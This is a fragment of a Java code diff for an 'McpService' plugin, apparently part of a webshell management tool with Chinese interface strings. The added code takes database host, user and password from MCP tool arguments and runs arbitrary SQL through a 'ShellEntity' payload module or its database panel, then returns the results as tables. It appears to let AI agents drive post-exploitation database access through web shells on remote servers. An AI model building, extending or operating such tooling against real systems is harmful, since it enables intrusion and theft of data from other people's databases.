+            throw new IllegalArgumentException("\u672a\u627e\u5230\u6570\u636e\u5e93\u8fde\u63a5");
+        }
+        ensureDbDrive(sh, dbInfo);
+        ShellDatabasePanel panel = findLiveDatabasePanel(sh);
+        if (panel != null) {
+            bindPanelDbInfo(panel, dbInfo);
+            GDatabaseResult r = panel.execSql(execType, sql);
+            if (r != null) {
+                return r;
+            }
+        }
+        DbInfo clone = (DbInfo) dbInfo.clone();
+        return sh.getPayloadModule().execSql(clone, execType, sql);
+    }
+
+    private ShellDatabasePanel findLiveDatabasePanel(ShellEntity sh) {
+        try {
+            if (sh.getFrame() != null) {
+                Object c = sh.getFrame().getBasicComponent("DatabaseManage");
+                if (c instanceof ShellDatabasePanel) {
+                    return (ShellDatabasePanel) c;
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+        return null;
+    }
+
+    private void bindPanelDbInfo(ShellDatabasePanel panel, DbInfo dbInfo) {
+        try {
+            java.lang.reflect.Field f = ShellDatabasePanel.class.getDeclaredField("dbInfo");
+            f.setAccessible(true);
+            f.set(panel, dbInfo);
+        } catch (Exception ignored) {
+        }
+        if (panel.currentDbTextField != null) {
+            String cur = dbInfo.getCurrentDatabase();
+            panel.currentDbTextField.setText(cur == null ? "" : cur);
+        }
+    }
+
+    private void applyDbArgs(DbInfo dbInfo, Map<String, Object> a) {
+        if (!isBlank(a.get("dbType"))) dbInfo.setDatabaseType(strArg(a.get("dbType")));
+        if (!isBlank(a.get("dbHost"))) dbInfo.setHost(strArg(a.get("dbHost")));
+        if (!isBlank(a.get("dbPort"))) dbInfo.setPort(toInt(a.get("dbPort"), defaultDbPort(dbInfo.getDatabaseType())));
+        if (!isBlank(a.get("dbName"))) dbInfo.setCurrentDatabase(strArg(a.get("dbName")));
+        if (!isBlank(a.get("dbUser"))) dbInfo.setUsername(strArg(a.get("dbUser")));
+        if (!isBlank(a.get("dbPass"))) dbInfo.setPassword(strArg(a.get("dbPass")));
+        if (!isBlank(a.get("dbCharset"))) dbInfo.setDatabaseCharset(strArg(a.get("dbCharset")));
+        if (!isBlank(a.get("dbDriver"))) dbInfo.setDatabaseDrive(strArg(a.get("dbDriver")));
+        if (!isBlank(a.get("connectionString"))) dbInfo.setConnectionString(strArg(a.get("connectionString")));
+        if (dbInfo.getPort() <= 0 && !isBlank(dbInfo.getDatabaseType())) {
+            dbInfo.setPort(defaultDbPort(dbInfo.getDatabaseType()));
+        }
+    }
+
+    @SuppressWarnings("unchecked")
+    private DbInfo dbInfoFromArgs(Map<String, Object> a) {
+        Object dbInfoObj = a.get("dbInfo");
+        DbInfo info = null;
+        if (dbInfoObj instanceof Map) {
+            info = new Yaml().loadAs(new Yaml().dump(dbInfoObj), DbInfo.class);
+        } else if (dbInfoObj instanceof String && !isBlank(dbInfoObj)) {
+            info = new Yaml().loadAs((String) dbInfoObj, DbInfo.class);
+        }
+        if (info == null) {
+            info = new DbInfo();
+        }
+        applyDbArgs(info, a);
+        if (!isBlank(a.get("configName"))) {
+            info.setConfigName(strArg(a.get("configName")));
+        }
+        if (isBlank(info.getConfigName()) && isBlank(info.getDatabaseType()) && isBlank(info.getHost())) {
+            return null;
+        }
+        if (isBlank(info.getConfigName())) {
+            String auto = nvl(info.getDatabaseType()) + "-" + nvl(info.getHost()) + "-" + nvl(info.getCurrentDatabase());
+            info.setConfigName(auto.replaceAll("[^A-Za-z0-9._-]", "_"));
+        }
+        return info;
+    }
+
+    private String formatDbResult(Object result) {
+        if (result == null) return "null";
+        if (result instanceof GDatabaseResult) {
+            GDatabaseResult r = (GDatabaseResult) result;
+            Vector<String> cols = r.getColumnVector();
+            Vector<Vector<String>> rows = r.getRowsVector();
+            StringBuilder sb = new StringBuilder();
+            if (cols != null && !cols.isEmpty()) {
+                sb.append(joinTab(cols)).append("\n");
+            }
+            int n = 0;
+            if (rows != null) {
+                for (Vector<String> row : rows) {
+                    sb.append(joinTab(row)).append("\n");
+                    n++;
+                }
+            }
+            sb.append("(").append(n).append(" rows)");
+            return sb.toString();
+        }
+        return String.valueOf(result);
+    }
+
+    private static String joinTab(Vector<String> cells) {
+        if (cells == null || cells.isEmpty()) return "";
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < cells.size(); i++) {
+            if (i > 0) sb.append('\t');
+            String v = cells.get(i);
+            sb.append(v == null ? "" : v.replace('\t', ' ').replace('\n', ' '));
+        }
+        return sb.toString();
+    }
+
+    private String formatDbInfo(DbInfo info) {
+        StringBuilder sb = new StringBuilder();
+        sb.append("configName=").append(nvl(info.getConfigName())).append("\n");
+        sb.append("dbType=").append(nvl(info.getDatabaseType())).append("\n");
+        sb.append("host=").append(nvl(info.getHost())).append("\n");
+        sb.append("port=").append(info.getPort()).append("\n");
+        sb.append("dbName=").append(nvl(info.getCurrentDatabase())).append("\n");
+        sb.append("user=").append(nvl(info.getUsername())).append("\n");
+        sb.append("charset=").append(nvl(info.getDatabaseCharset())).append("\n");
+        sb.append("driver=").append(nvl(info.getDatabaseDrive())).append("\n");
+        return sb.toString();
+    }
+
+    private static String dbNeedConfigHint(ShellEntity sh) {
+        String[] configs = sh.listDatabaseConfigs();
+        if (configs != null && configs.length > 1) {
+            return "\u8bf7\u4f20 configName \u6216 dbType/dbHost\u3002\u5df2\u4fdd\u5b58: " + String.join(", ", configs);
+        }
+        return "\u8bf7\u4f20 configName(\u5148 db_configs list)\u6216 dbType/dbHost/dbUser/dbPass";
+    }
+
+    private static String inferExecType(String sql, String execType) {
+        if (!isBlank(execType)) return execType.trim();
+        if (sql == null) return "select";
+        String low = sql.trim().toLowerCase();
+        if (low.startsWith("select") || low.startsWith("show") || low.startsWith("desc")
+                || low.startsWith("describe") || low.startsWith("explain") || low.startsWith("pragma")
+                || low.startsWith("with") || low.startsWith("values")) {
+            return "select";
+        }
+        return "update";
+    }
+
+    private static int defaultDbPort(String type) {
+        if (type == null) return 3306;
+        switch (type.toLowerCase()) {
+            case "sqlserver": return 1433;
+            case "oracle": return 1521;
+            case "postgresql": return 5432;
+            case "sqlite": return 0;
+            default: return 3306;
+        }
+    }
+
+    private static boolean isBlank(Object o) {
+        if (o == null) return true;
+        String s = String.valueOf(o).trim();
+        return s.isEmpty() || "null".equalsIgnoreCase(s);
+    }
+
+    private static String strArg(Object o) {
+        return o == null ? null : String.valueOf(o).trim();
+    }
+
+    private static String nvl(String s) {
+        return s == null ? "" : s;
+    }
+
+    private static String firstNonBlank(String... vals) {
+        if (vals == null) return null;
+        for (String v : vals) {
+            if (!isBlank(v)) return v;
+        }
+        return null;
     }
 
     // --- Payloads ---
@@ -2667,7 +3232,7 @@ public class McpService implements Plugin {
         sb.append("  \u63a8\u8350: http://").append(preferredAccessHost()).append(":").append(port).append("/sse\n");
         sb.append("  \u53ef\u8bbf\u95ee:\n");
         for (String u : listAccessUrls()) sb.append("    ").append(u).append("/sse\n");
-        sb.append("  SSE \u5ba2\u6237\u7aef: ").append(sseClients.size()).append("\n");
+        sb.append("  SSE \u5ba2\u6237\u7aef: ").append(sseSessions.size()).append("\n");
         sb.append("  Shell \u603b\u6570: ").append(Math.max(0, shellCount)).append("\n");
         sb.append("  DB \u6a21\u5f0f: ").append(core.ui.MainActivity.isRemoteDb ? "\u8fdc\u7a0b PostgreSQL" : "\u672c\u5730 SQLite");
         return sb.toString();
